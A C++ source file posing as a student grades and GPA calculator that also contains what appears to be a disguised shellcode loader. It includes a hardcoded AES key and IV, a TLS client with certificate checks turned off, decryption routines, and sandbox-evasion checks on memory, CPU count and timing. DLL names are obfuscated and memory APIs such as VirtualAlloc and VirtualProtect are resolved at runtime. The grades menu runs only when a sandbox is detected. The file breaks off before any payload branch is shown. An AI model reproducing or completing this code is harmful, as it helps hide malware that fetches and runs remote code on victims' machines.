// grades7.0.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#define SECURITY_WIN32
#define NOMINMAX

#include <WinSock2.h>
#include <Windows.h>
#include <security.h>
#include <schannel.h>
#include <sspi.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <cmath>
#include <thread>
#include <chrono>
#include <numeric>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")






//SecureZeroMemory(moduleName, sizeof(moduleName));

std::vector<double> possibleGPA = {
	0.0,       0.142857,  0.285714,  0.428571,  0.571429,  0.714286,  0.857143,
	1.0,       1.142857,  1.285714,  1.428571,  1.571429,  1.714286,  1.857143,
	2.0,       2.142857,  2.285714,  2.428571,  2.571429,  2.714286,  2.857143,
	3.0,       3.142857,  3.285714,  3.428571,  3.571429,  3.714286,  3.857143,
	4.0,       4.142857,  4.285714,  4.428571,  4.571429,  4.714286,  4.857143,
	5.0,       5.142857,  5.285714,  5.428571,  5.571429,  5.714286,  5.857143,
	6.0,       6.142857,  6.285714,  6.428571,  6.571429,  6.714286,  6.857143,
	7.0,       7.142857,  7.285714,  7.328571,  7.571429,  7.714286,  7.857143,
	8.0
};

static const std::vector<BYTE> g_key = {
	0x3a, 0x7f, 0x1c, 0x9e, 0x42, 0x8b, 0xd5, 0x60,
	0x2f, 0xa1, 0xcb, 0x73, 0x18, 0xe4, 0x96, 0x0d,
	0x55, 0x8c, 0x21, 0xba, 0xf3, 0x6e, 0x47, 0x9a,
	0x30, 0xc2, 0x7d, 0x1b, 0xa8, 0x54, 0xe9, 0x62
};

static const std::vector<BYTE> g_iv = {
	0x91, 0x4d, 0x2a, 0xf8, 0x03, 0xc7, 0x6e, 0x5b,
	0x80, 0x19, 0xd4, 0x37, 0xab, 0x62, 0x0f, 0xe5
};

bool ClientHandshake(SOCKET sock, const char* serverName,
	CredHandle& hCred, CtxtHandle& hCtxt,
	std::vector<BYTE>& pending) {
	SCHANNEL_CRED schCred = { 0 };
	schCred.dwVersion = SCHANNEL_CRED_VERSION;
	schCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
	schCred.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION |
		SCH_CRED_NO_DEFAULT_CREDS |
		SCH_CRED_IGNORE_NO_REVOCATION_CHECK;

	TimeStamp ts;
	SECURITY_STATUS status = AcquireCredentialsHandleA(
		NULL, const_cast<LPSTR>(UNISP_NAME_A),
		SECPKG_CRED_OUTBOUND, NULL, &schCred,
		NULL, NULL, &hCred, &ts);
	if (status != SEC_E_OK) {
 		return false;
	}

	DWORD reqFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
		ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM |
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION;

	std::vector<BYTE> accum;
	bool haveContext = false;
	SECURITY_STATUS ret = SEC_I_CONTINUE_NEEDED;
	bool first = true;

	while (ret == SEC_I_CONTINUE_NEEDED || ret == SEC_E_INCOMPLETE_MESSAGE || first) {
		first = false;

		SecBuffer inBufs[2] = { 0 };
		SecBufferDesc inDesc = { SECBUFFER_VERSION, 2, inBufs };
		inBufs[0].BufferType = SECBUFFER_TOKEN;
		inBufs[0].pvBuffer = accum.empty() ? NULL : accum.data();
		inBufs[0].cbBuffer = (unsigned long)accum.size();
		inBufs[1].BufferType = SECBUFFER_EMPTY;

		SecBuffer outBuf = { 0 };
		SecBufferDesc outDesc = { SECBUFFER_VERSION, 1, &outBuf };
		outBuf.BufferType = SECBUFFER_TOKEN;

		DWORD attrs = 0;
		ret = InitializeSecurityContextA(
			&hCred,
			haveContext ? &hCtxt : NULL,
			const_cast<LPSTR>(serverName),
			reqFlags, 0, 0,
			accum.empty() ? NULL : &inDesc,
			0,
			haveContext ? NULL : &hCtxt,
			&outDesc, &attrs, &ts);
		haveContext = true;

		if (outBuf.cbBuffer && outBuf.pvBuffer) {
			send(sock, (const char*)outBuf.pvBuffer, outBuf.cbBuffer, 0);
			FreeContextBuffer(outBuf.pvBuffer);
		}

		if (ret == SEC_E_OK) {
 			if (inBufs[1].BufferType == SECBUFFER_EXTRA && inBufs[1].cbBuffer > 0) {
				BYTE* p = (BYTE*)inBufs[0].pvBuffer + (inBufs[0].cbBuffer - inBufs[1].cbBuffer);
				pending.assign(p, p + inBufs[1].cbBuffer);
			}
			return true;
		}
		else if (ret == SEC_I_CONTINUE_NEEDED || ret == SEC_E_INCOMPLETE_MESSAGE) {
			if (inBufs[1].BufferType == SECBUFFER_EXTRA && inBufs[1].cbBuffer > 0) {
				size_t extra = inBufs[1].cbBuffer;
				memmove(accum.data(),
					(BYTE*)inBufs[0].pvBuffer + (accum.size() - extra), extra);
				accum.resize(extra);
			}
			else {
				accum.clear();
			}
			char tmp[8192];
			int n = recv(sock, tmp, sizeof(tmp), 0);
			if (n <= 0) { printf("[-] Connection closed during handshake\n"); return false; }
			accum.insert(accum.end(), (BYTE*)tmp, (BYTE*)tmp + n);
		}
		else {
 			return false;
		}
	}
	return false;
}

bool ReceiveAll(SOCKET sock, CtxtHandle& hCtxt,
	std::vector<BYTE>& accum, std::vector<BYTE>& plaintext) {
	char tmp[8192];
	int n;

	do {
		while (!accum.empty()) {
			SecBuffer bufs[4] = { 0 };
			SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };
			bufs[0].BufferType = SECBUFFER_DATA;
			bufs[0].pvBuffer = accum.data();
			bufs[0].cbBuffer = (unsigned long)accum.size();
			bufs[1].BufferType = SECBUFFER_EMPTY;
			bufs[2].BufferType = SECBUFFER_EMPTY;
			bufs[3].BufferType = SECBUFFER_EMPTY;

			SECURITY_STATUS st = DecryptMessage(&hCtxt, &desc, 0, NULL);

			if (st == SEC_E_OK) {
				for (int i = 1; i < 4; i++) {
					if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer) {
						BYTE* p = (BYTE*)bufs[i].pvBuffer;
						plaintext.insert(plaintext.end(), p, p + bufs[i].cbBuffer);
					}
				}
				size_t extra = 0;
				for (int i = 1; i < 4; i++) {
					if (bufs[i].BufferType == SECBUFFER_EXTRA)
						extra += bufs[i].cbBuffer;
				}
				if (extra)
					memmove(accum.data(), accum.data() + (accum.size() - extra), extra);
				accum.resize(extra);
			}
			else if (st == SEC_E_INCOMPLETE_MESSAGE) {
				break;
			}
			else if (st == SEC_I_CONTEXT_EXPIRED) {
 				return true;
			}
			else {
 				return false;
			}
		}
		n = recv(sock, tmp, sizeof(tmp), 0);
		if (n > 0)
			accum.insert(accum.end(), (BYTE*)tmp, (BYTE*)tmp + n);
	} while (n > 0);
	return true;
}

std::vector<BYTE> Base64Decode(const std::string& s) {
	DWORD len = 0;
	CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64,
		NULL, &len, NULL, NULL);
	std::vector<BYTE> out(len);
	if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64,
		out.data(), &len, NULL, NULL)) {
 		return {};
	}
	out.resize(len);
	return out;
}

bool ImportAesKey(HCRYPTPROV hProv, HCRYPTKEY& hKey) {
	struct Aes256KeyBlob {
		BLOBHEADER hdr;
		DWORD      keySize;
		BYTE       keyData[32];
	} blob = {};

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_256;
	blob.keySize = 32;
	memcpy(blob.keyData, g_key.data(), 32);

	return CryptImportKey(hProv, (BYTE*)&blob, sizeof(blob), 0, 0, &hKey) != FALSE;
}

std::vector<BYTE> Aes256Decrypt(const std::vector<BYTE>& ciphertext) {
	HCRYPTPROV hProv = 0;
	HCRYPTKEY  hKey = 0;
	std::vector<BYTE> out;

	if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W,
		PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
 		return {};
	}
	if (!ImportAesKey(hProv, hKey)) {
 		CryptReleaseContext(hProv, 0);
		return {};
	}

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
	CryptSetKeyParam(hKey, KP_IV, const_cast<BYTE*>(g_iv.data()), 0);

	out = ciphertext; // decrypt in place
	DWORD len = (DWORD)out.size();
	if (!CryptDecrypt(hKey, 0, TRUE, 0, out.data(), &len)) {
 		out.clear();
	}
	else {
		out.resize(len);
	}

	CryptDestroyKey(hKey);
	CryptReleaseContext(hProv, 0);
	return out;
}

int displayMenu() {
	int option;
      
	if (!(std::cin >> option)) {
		std::cin.clear();
		std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
		return 1000;
	}

	std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
	switch (option) {
	case 1:
	case 2:
	case 3:
	case 4:
		return option;

	default:
		std::cin.clear();
		return 1000;

	}
}

bool isSandbox() {
	MEMORYSTATUSEX mem = { sizeof(mem) };
	GlobalMemoryStatusEx(&mem);
	if (mem.ullTotalPhys < 8ULL * 1024 * 1024 * 1024) return true;

	SYSTEM_INFO si;
	GetSystemInfo(&si);
	if (si.dwNumberOfProcessors < 4) return true;

	LARGE_INTEGER freq, before, after;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&before);

	HANDLE hTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
	LARGE_INTEGER dueTime;
	dueTime.QuadPart = -50000000LL;
	SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
	WaitForSingleObject(hTimer, INFINITE);
	CloseHandle(hTimer);

	QueryPerformanceCounter(&after);
	double elapsed = (double)(after.QuadPart - before.QuadPart) / freq.QuadPart;
	if (elapsed < 4.5) return true;
	return false;
}

int main()
{

	typedef BOOL(WINAPI* LPFN_GLOBALMEMORYSTATUSEX)(LPMEMORYSTATUSEX lpBuffer);
	typedef void(WINAPI* LPFN_GETSYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	typedef BOOL(WINAPI* LPFN_QUERYPERFORMANCEFREQUENCY)(LARGE_INTEGER* lpFrequency);
	typedef BOOL(WINAPI* LPFN_QUERYPERFORMANCECOUNTER)(LARGE_INTEGER* lpPerformanceCount);
	typedef HANDLE(WINAPI* LPFN_CREATEWAITABLETIMERA)(LPSECURITY_ATTRIBUTES lpTimerAttributes, BOOL bManualReset, LPCSTR lpTimerName);
	typedef BOOL(WINAPI* LPFN_SETWAITABLETIMER)(HANDLE hTimer, const LARGE_INTEGER* lpDueTime, LONG lPeriod, PTIMERAPCROUTINE pfnCompletionRoutine, LPVOID lpArgToCompletionRoutine, BOOL fResume);
	typedef BOOL(WINAPI* LPFN_CLOSEHANDLE)(HANDLE hObject);

	typedef LPVOID(WINAPI* LPFN_VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	typedef BOOL(WINAPI* LPFN_VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
	typedef BOOL(WINAPI* LPFN_VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

	typedef int (WSAAPI* LPFN_WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);
	typedef int (WSAAPI* LPFN_WSACLEANUP)(void);
	typedef SOCKET(WSAAPI* LPFN_SOCKET)(int af, int type, int protocol);
	typedef int (WSAAPI* LPFN_CONNECT)(SOCKET s, const struct sockaddr* name, int namelen);
	typedef INT(WSAAPI* LPFN_INET_PTON)(INT Family, PCSTR pszAddrString, PVOID pAddrBuf);
	typedef int (WSAAPI* LPFN_SEND)(SOCKET s, const char* buf, int len, int flags);
	typedef int (WSAAPI* LPFN_RECV)(SOCKET s, char* buf, int len, int flags);
	typedef int (WSAAPI* LPFN_CLOSESOCKET)(SOCKET s);

	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_ACQUIRECREDENTIALSHANDLEA)(LPSTR pszPrincipal, LPSTR pszPackage, ULONG fCredentialUse, void* pvLogonID, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry);
	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_INITIALIZESECURITYCONTEXTA)(PCredHandle phCredential, PCtxtHandle phContext, LPSTR pszTargetName, ULONG fContextReq, ULONG Reserved1, ULONG TargetDataRep, PSecBufferDesc pInput, ULONG Reserved2, PCtxtHandle phNewContext, PSecBufferDesc pOutput, ULONG* pfContextAttr, PTimeStamp ptsExpiry);
	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_DECRYPTMESSAGE)(PCtxtHandle phContext, PSecBufferDesc pMessage, ULONG MessageSequenceNo, ULONG* pfQOP);
	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_FREECONTEXTBUFFER)(PVOID pvContextBuffer);
	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_DELETESECURITYCONTEXT)(PCtxtHandle phContext);
	typedef SECURITY_STATUS(SEC_ENTRY* LPFN_FREECREDENTIALSHANDLE)(PCredHandle phCredential);

	typedef BOOL(WINAPI* LPFN_CRYPTSTRINGTOBINARYA)(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags);
	typedef BOOL(WINAPI* LPFN_CRYPTACQUIRECONTEXTW)(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
	typedef BOOL(WINAPI* LPFN_CRYPTIMPORTKEY)(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey);
	typedef BOOL(WINAPI* LPFN_CRYPTSETKEYPARAM)(HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags);
	typedef BOOL(WINAPI* LPFN_CRYPTDECRYPT)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
	typedef BOOL(WINAPI* LPFN_CRYPTDESTROYKEY)(HCRYPTKEY hKey);
	typedef BOOL(WINAPI* LPFN_CRYPTRELEASECONTEXT)(HCRYPTPROV hProv, DWORD dwFlags);

	volatile char kernel32[13];
	kernel32[0] = 'k'; kernel32[1] = 'e'; kernel32[2] = 'r'; kernel32[3] = 'n'; kernel32[4] = 'e'; kernel32[5] = 'l'; kernel32[6] = '3'; kernel32[7] = '2'; kernel32[8] = '.'; kernel32[9] = 'd'; kernel32[10] = 'l'; kernel32[11] = 'l'; kernel32[12] = '\0';
	HMODULE hKernel32 = GetModuleHandleA((const char*)kernel32);
	SecureZeroMemory((void*)kernel32, sizeof(kernel32));
	volatile char ws2_32[11];
	ws2_32[0] = 'w'; ws2_32[1] = 's'; ws2_32[2] = '2'; ws2_32[3] = '_'; ws2_32[4] = '3'; ws2_32[5] = '2'; ws2_32[6] = '.'; ws2_32[7] = 'd'; ws2_32[8] = 'l'; ws2_32[9] = 'l'; ws2_32[10] = '\0';
	HMODULE hWs2_32 = LoadLibraryA((const char*)ws2_32);
	SecureZeroMemory((void*)ws2_32, sizeof(ws2_32));
	volatile char secur32[12];
	secur32[0] = 's'; secur32[1] = 'e'; secur32[2] = 'c'; secur32[3] = 'u'; secur32[4] = 'r'; secur32[5] = '3'; secur32[6] = '2'; secur32[7] = '.'; secur32[8] = 'd'; secur32[9] = 'l'; secur32[10] = 'l'; secur32[11] = '\0';
	HMODULE hSecur32 = LoadLibraryA((const char*)secur32);
	SecureZeroMemory((void*)secur32, sizeof(secur32));
	volatile char crypt32[12];
	crypt32[0] = 'c'; crypt32[1] = 'r'; crypt32[2] = 'y'; crypt32[3] = 'p'; crypt32[4] = 't'; crypt32[5] = '3'; crypt32[6] = '2'; crypt32[7] = '.'; crypt32[8] = 'd'; crypt32[9] = 'l'; crypt32[10] = 'l'; crypt32[11] = '\0';
	HMODULE hCrypt32 = LoadLibraryA((const char*)crypt32);
	SecureZeroMemory((void*)crypt32, sizeof(crypt32));
	volatile char advapi32[13];
	advapi32[0] = 'a'; advapi32[1] = 'd'; advapi32[2] = 'v'; advapi32[3] = 'a'; advapi32[4] = 'p'; advapi32[5] = 'i'; advapi32[6] = '3'; advapi32[7] = '2'; advapi32[8] = '.'; advapi32[9] = 'd'; advapi32[10] = 'l'; advapi32[11] = 'l'; advapi32[12] = '\0';
	HMODULE hAdvapi32 = LoadLibraryA((const char*)advapi32);
	SecureZeroMemory((void*)advapi32, sizeof(advapi32));


	LPFN_GLOBALMEMORYSTATUSEX pGlobalMemoryStatusEx = (LPFN_GLOBALMEMORYSTATUSEX)GetProcAddress(hKernel32, "GlobalMemoryStatusEx");
	LPFN_GETSYSTEMINFO pGetSystemInfo = (LPFN_GETSYSTEMINFO)GetProcAddress(hKernel32, "GetSystemInfo");
	LPFN_QUERYPERFORMANCEFREQUENCY pQueryPerformanceFrequency = (LPFN_QUERYPERFORMANCEFREQUENCY)GetProcAddress(hKernel32, "QueryPerformanceFrequency");
	LPFN_QUERYPERFORMANCECOUNTER pQueryPerformanceCounter = (LPFN_QUERYPERFORMANCECOUNTER)GetProcAddress(hKernel32, "QueryPerformanceCounter");
	LPFN_CREATEWAITABLETIMERA pCreateWaitableTimerA = (LPFN_CREATEWAITABLETIMERA)GetProcAddress(hKernel32, "CreateWaitableTimerA");
	LPFN_SETWAITABLETIMER pSetWaitableTimer = (LPFN_SETWAITABLETIMER)GetProcAddress(hKernel32, "SetWaitableTimer");
	LPFN_CLOSEHANDLE pCloseHandle = (LPFN_CLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle");
	LPFN_VIRTUALALLOC pVirtualAlloc = (LPFN_VIRTUALALLOC)GetProcAddress(hKernel32, "VirtualAlloc");
	LPFN_VIRTUALPROTECT pVirtualProtect = (LPFN_VIRTUALPROTECT)GetProcAddress(hKernel32, "VirtualProtect");
	LPFN_VIRTUALFREE pVirtualFree = (LPFN_VIRTUALFREE)GetProcAddress(hKernel32, "VirtualFree");

	LPFN_WSASTARTUP pWSAStartup = (LPFN_WSASTARTUP)GetProcAddress(hWs2_32, "WSAStartup");
	LPFN_WSACLEANUP pWSACleanup = (LPFN_WSACLEANUP)GetProcAddress(hWs2_32, "WSACLEANUP");
	LPFN_SOCKET p_socket = (LPFN_SOCKET)GetProcAddress(hWs2_32, "socket");
	LPFN_CONNECT p_connect = (LPFN_CONNECT)GetProcAddress(hWs2_32, "connect");
	LPFN_INET_PTON pInet_pton = (LPFN_INET_PTON)GetProcAddress(hWs2_32, "inet_pton");
	LPFN_SEND p_send = (LPFN_SEND)GetProcAddress(hWs2_32, "send");
	LPFN_RECV p_recv = (LPFN_RECV)GetProcAddress(hWs2_32, "recv");
	LPFN_CLOSESOCKET pClosesocket = (LPFN_CLOSESOCKET)GetProcAddress(hWs2_32, "closesocket");

	LPFN_ACQUIRECREDENTIALSHANDLEA pAcquireCredentialsHandleA = (LPFN_ACQUIRECREDENTIALSHANDLEA)GetProcAddress(hSecur32, "AcquireCredentialsHandleA");
	LPFN_INITIALIZESECURITYCONTEXTA pInitializeSecurityContextA = (LPFN_INITIALIZESECURITYCONTEXTA)GetProcAddress(hSecur32, "InitializeSecurityContextA");
	LPFN_DECRYPTMESSAGE pDecryptMessage = (LPFN_DECRYPTMESSAGE)GetProcAddress(hSecur32, "DecryptMessage");
	LPFN_FREECONTEXTBUFFER pFreeContextBuffer = (LPFN_FREECONTEXTBUFFER)GetProcAddress(hSecur32, "FreeContextBuffer");
	LPFN_DELETESECURITYCONTEXT pDeleteSecurityContext = (LPFN_DELETESECURITYCONTEXT)GetProcAddress(hSecur32, "DeleteSecurityContext");
	LPFN_FREECREDENTIALSHANDLE pFreeCredentialsHandle = (LPFN_FREECREDENTIALSHANDLE)GetProcAddress(hSecur32, "FreeCredentialsHandle");

	LPFN_CRYPTSTRINGTOBINARYA pCryptStringToBinaryA = (LPFN_CRYPTSTRINGTOBINARYA)GetProcAddress(hCrypt32, "CryptStringToBinaryA");
	LPFN_CRYPTACQUIRECONTEXTW pCryptAcquireContextW = (LPFN_CRYPTACQUIRECONTEXTW)GetProcAddress(hAdvapi32, "CryptAcquireContextW");
	LPFN_CRYPTIMPORTKEY pCryptImportKey = (LPFN_CRYPTIMPORTKEY)GetProcAddress(hAdvapi32, "CryptImportKey");
	LPFN_CRYPTSETKEYPARAM pCryptSetKeyParam = (LPFN_CRYPTSETKEYPARAM)GetProcAddress(hAdvapi32, "CryptSetKeyParam");
	LPFN_CRYPTDECRYPT pCryptDecrypt = (LPFN_CRYPTDECRYPT)GetProcAddress(hAdvapi32, "CryptDecrypt");
	LPFN_CRYPTDESTROYKEY pCryptDestroyKey = (LPFN_CRYPTDESTROYKEY)GetProcAddress(hAdvapi32, "CryptDestroyKey");
	LPFN_CRYPTRELEASECONTEXT pCryptReleaseContext = (LPFN_CRYPTRELEASECONTEXT)GetProcAddress(hAdvapi32, "CryptReleaseContext");


	/*
	1. Math
	2. Science
	3. English
	4. I&S
	5. PHE
	6. Design/Media Arts
	7. Languages
	*/

	double targetGPA;
	bool gradesFileExists = true;
	bool running = true;
	std::string currentLine;
	std::vector<std::string> grades;

	if (isSandbox()) {
		while (running) {
			system("cls");
			int opt = displayMenu();
			if (opt == 1000) {
				continue;
			}
			switch (opt) {
			case 1:
			{
				std::ifstream gradesFile("grades.txt");
				grades.clear();
				if (gradesFile.is_open()) {
					while (std::getline(gradesFile, currentLine)) {
						grades.push_back(currentLine);
					}
				}
				else {
					gradesFileExists = false;
				}

				gradesFile.close();

				if (gradesFileExists == false) {
 					std::string test = "";
 					std::getline(std::cin, test);
				}
				else {
					for (int i = 0; i < grades.size(); i++) {
						switch (i) {
						case 0:
 							break;
						case 1:
 							break;
						case 2:
 							break;
						case 3:
 							break;
						case 4:
 							break;
						case 5:
 							break;
						case 6:
 							break;
						}
						int len = grades[i].length();
						for (int e = 0; e < len; e += 4) {
  						}
 					}
					std::string test = "";
 					std::getline(std::cin, test);
				}
			}
			break;
			case 2:
			{
				std::string close;
				bool gpaExists = true;
				std::string oldGPAbuf;
				double oldGPA;
				std::ifstream gpa("gpa.txt");
				if (!gpa.is_open()) {
					gpaExists = false;
				}
 				std::string targetGPAbuf;
				std::getline(std::cin, targetGPAbuf);
				targetGPA = std::stod(targetGPAbuf);

				bool isPossible = false;

				if (7.0 >= targetGPA && targetGPA > 0.00) {
 					if (gpaExists == true) {
						std::getline(gpa, oldGPAbuf);
						oldGPA = std::stod(oldGPAbuf);
						gpa.close();
 						std::ofstream gpa("gpa.txt", std::ios::trunc);
						gpa << targetGPA;
 						std::getline(std::cin, close);
					}
					else {
						std::ofstream gpa("gpa.txt");
						gpa << targetGPA;
 						std::getline(std::cin, close);
					}
				}
				else {
 					std::cin.clear();
					std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
 					std::getline(std::cin, close);
				}
				gpa.close();
			}
			break;
			case 3:
			{
				bool quit = false;
				std::string close;
				std::string math, science, english, languages, phe, is, design;
				for (int i = 0; i < 7 && !quit; i++) {
					std::vector<std::string> subList = { "Math", "Science", "English", "I&S", "PHE", "Design/Media Arts", "Languages" };
    					switch (i) {
					case 0:
						std::getline(std::cin, math);
						if (std::stod(math) > 8.0 || std::stod(math) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 1:
						std::getline(std::cin, science);
						if (std::stod(science) > 8.0 || std::stod(science) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 2:
						std::getline(std::cin, english);
						if (std::stod(english) > 8.0 || std::stod(english) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 3:
						std::getline(std::cin, languages);
						if (std::stod(languages) > 8.0 || std::stod(languages) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 4:
						std::getline(std::cin, phe);
						if (std::stod(phe) > 8.0 || std::stod(phe) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 5:
						std::getline(std::cin, is);
						if (std::stod(is) > 8.0 || std::stod(is) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					case 6:
						std::getline(std::cin, design);
						if (std::stod(design) > 8.0 || std::stod(design) < 0) {
 							std::this_thread::sleep_for(std::chrono::milliseconds(2000));
							quit = true;
						}
						break;
					}
					if (math == "-1" || science == "-1" || english == "-1" || languages == "-1" || phe == "-1" || is == "-1" || design == "-1") {
						quit = true;
					}
				}
				if (quit) {
					system("cls");
					break;
				}
				std::ofstream gradesFile("grades.txt", std::ios::trunc);
				if (!gradesFile.is_open()) {
 					break;
				}
				std::erase_if(math, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(science, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(english, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(is, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(phe, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(languages, [](unsigned char ch) {
					return std::isspace(ch);
					});
				std::erase_if(design, [](unsigned char ch) {
					return std::isspace(ch);
					});

				gradesFile << math << "\n";
				gradesFile << science << "\n";
				gradesFile << english << "\n";
				gradesFile << is << "\n";
				gradesFile << phe << "\n";
				gradesFile << design << "\n";
				gradesFile << languages;
  				std::getline(std::cin, close);
			}
			break;
			case 4:
			{
				// Identify users chosen GPA
				std::string close;
				double setGPA;
				double chosenGPA;
				std::string setGPAbuf;
				std::vector<double> buf;
				std::ifstream gpa("gpa.txt");
				if (!gpa.is_open()) {
  					std::getline(std::cin, close);
					break;
				}
				std::getline(gpa, setGPAbuf);
				setGPA = std::stod(setGPAbuf);
				gpa.close();
				for (int i = 0; i < possibleGPA.size(); i++) {
					buf.push_back(std::abs((possibleGPA[i] * 7) - (setGPA * 7)));
				}
				double smallest = buf[0];
				int smallestIndex;
				for (int i = 0; i < buf.size(); i++) {
					if (buf[i] < smallest) {
						smallest = buf[i];
						smallestIndex = i;
					}
				}
				chosenGPA = possibleGPA[smallestIndex];

				// Current GPA
				std::ifstream gradesFile("grades.txt");
				if (gradesFile.is_open()) {
					while (std::getline(gradesFile, currentLine)) {
						grades.push_back(currentLine);
					}
				}
				else {
					gradesFileExists = false;
				}

				gradesFile.close();

				if (gradesFileExists == false) {
  					std::getline(std::cin, close);
					break;
				}

				std::vector<int> mathAvg;
				std::vector<int> englishAvg;
				std::vector<int> scienceAvg;
				std::vector<int> isAvg;
				std::vector<int> pheAvg;
				std::vector<int> languagesAvg;
				std::vector<int> designAvg;

				for (int i = 0; i < grades.size(); i++) {
					int len = grades[i].length();
					std::vector<int> c1;
					std::vector<int> c2;
					std::vector<int> c3;
					std::vector<int> c4;
					for (int e = 0; e < len; e += 4) {
						c1.push_back(grades[i][e] - '0');
						c2.push_back(grades[i][e + 1] - '0');
						c3.push_back(grades[i][e + 2] - '0');
						c4.push_back(grades[i][e + 3] - '0');
					}
					double c1avg = std::floor(std::accumulate(c1.begin(), c1.end(), 0)) / c1.size();
					double c2avg = std::floor(std::accumulate(c2.begin(), c2.end(), 0)) / c2.size();
					double c3avg = std::floor(std::accumulate(c3.begin(), c3.end(), 0)) / c3.size();
					double c4avg = std::floor(std::accumulate(c4.begin(), c4.end(), 0)) / c4.size();

					switch (i) {
					case 0:
						mathAvg.push_back(c1avg);
						mathAvg.push_back(c2avg);
						mathAvg.push_back(c3avg);
						mathAvg.push_back(c4avg);
						break;
					case 1:
						scienceAvg.push_back(c1avg);
						scienceAvg.push_back(c2avg);
						scienceAvg.push_back(c3avg);
						scienceAvg.push_back(c4avg);
						break;
					case 2:
						englishAvg.push_back(c1avg);
						englishAvg.push_back(c2avg);
						englishAvg.push_back(c3avg);
						englishAvg.push_back(c4avg);
						break;
					case 3:
						isAvg.push_back(c1avg);
						isAvg.push_back(c2avg);
						isAvg.push_back(c3avg);
						isAvg.push_back(c4avg);
						break;
					case 4:
						pheAvg.push_back(c1avg);
						pheAvg.push_back(c2avg);
						pheAvg.push_back(c3avg);
						pheAvg.push_back(c4avg);
						break;
					case 5:
						designAvg.push_back(c1avg);
						designAvg.push_back(c2avg);
						designAvg.push_back(c3avg);
						designAvg.push_back(c4avg);
						break;
					case 6:
						languagesAvg.push_back(c1avg);
						languagesAvg.push_back(c2avg);
						languagesAvg.push_back(c3avg);
						languagesAvg.push_back(c4avg);
						break;
					}
				}
				std::vector<double> gradeList;
				double currentAvg;
				gradeList.push_back(std::floor(std::accumulate(scienceAvg.begin(), scienceAvg.end(), 0)));
				gradeList.push_back(std::floor(std::accumulate(englishAvg.begin(), englishAvg.end(), 0)));
				gradeList.push_back(std::floor(std::accumulate(isAvg.begin(), isAvg.end(), 0)));
				gradeList.push_back(std::floor(std::accumulate(pheAvg.begin(), pheAvg.end(), 0)));
				gradeList.push_back(std::floor(std::accumulate(designAvg.begin(), designAvg.end(), 0)));
				gradeList.push_back(std::floor(std::accumulate(languagesAvg.begin(), languagesAvg.end(), 0)));
